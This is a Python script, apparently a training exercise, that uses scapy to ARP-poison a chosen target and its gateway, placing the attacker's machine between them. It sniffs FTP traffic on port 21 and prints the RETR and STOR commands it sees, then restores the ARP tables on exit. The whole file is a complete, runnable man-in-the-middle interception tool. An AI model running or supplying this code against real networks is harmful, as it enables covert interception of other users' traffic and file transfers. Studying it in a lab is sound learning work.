import os, sys, re, ipaddress, time, signal, threading
from scapy.all import ARP, send, sniff

def inquisitor(gateway_ip, gateway_mac, target_ip, target_mac):
    
    def arp_poison(target_ip, target_mac, spoof_ip, spoof_mac = None):
        if spoof_mac:
            arp_res = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        else:
            arp_res = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_res, verbose=False)
    
    def arp_restore(target_ip, target_mac, gateway_ip, gateway_mac):
        print("RESTORING ARP TABLES .. \n")
        arp_poison(target_ip, target_mac, gateway_ip, gateway_mac)
        arp_poison(gateway_ip, gateway_mac, target_ip, target_mac)
    
    def packet_handler(packet):
        if packet.haslayer("TCP") and packet.haslayer("Raw"):
            packet_data = packet["Raw"].load.decode("utf-8", errors="ignore")
            if "RETR" in packet_data:
                print(f"FTP File Download: { packet_data }")
            elif "STOR" in packet_data:
                print(f"FTP File Upload: { packet_data }")
    
    def signal_handler(sig, frame):
        arp_restore(target_ip, target_mac, gateway_ip, gateway_mac)
        sys.exit("ARP Attack STOPPED !\n")
    
    def ft_attack(gateway_ip, gateway_mac, target_ip, target_mac):
        try:
            while True:
                arp_poison(target_ip, target_mac, gateway_ip)
                arp_poison(gateway_ip, gateway_mac, target_ip)
                time.sleep(5)
        except Exception as e:
            arp_restore(target_ip, target_mac, gateway_ip, gateway_mac)
            sys.exit(f"ft_attack crashed, Exiting gracefully: {e}")
    try:
        arp_thread = threading.Thread(
            target=ft_attack,
            args=(gateway_ip, gateway_mac, target_ip, target_mac),
            daemon=True
        )
        arp_thread.start()
    
        signal.signal(signal.SIGINT, signal_handler)

        sniff(prn=packet_handler, filter="tcp port 21", store=False)

    except Exception as e:
        arp_restore(target_ip, target_mac, gateway_ip, gateway_mac)
        sys.exit(f"Something went wrong, Exiting gracefully: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 5:
        sys.exit("Error: Incorrect number of arguments. Usage: script.py <src_ip> <src_mac> <target_ip> <target_mac>")

    try:
        ipaddress.IPv4Address(sys.argv[1])
    except Exception as e:
        sys.exit("Error: Missing or invalid src IP")

    try:
        ipaddress.IPv4Address(sys.argv[3])
    except Exception as e:
        sys.exit("Error: Missing or invalid target IP")

    mac_pattern = re.compile(r'^[0-9A-Fa-f]{2}([-:])[0-9A-Fa-f]{2}(\1[0-9A-Fa-f]{2}){4}$')
    
    if not mac_pattern.match(sys.argv[2]):
        sys.exit("Error: Missing or invalid src MAC")
    
    if not mac_pattern.match(sys.argv[4]):
        sys.exit("Error: Missing or invalid target MAC")
    
    inquisitor(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
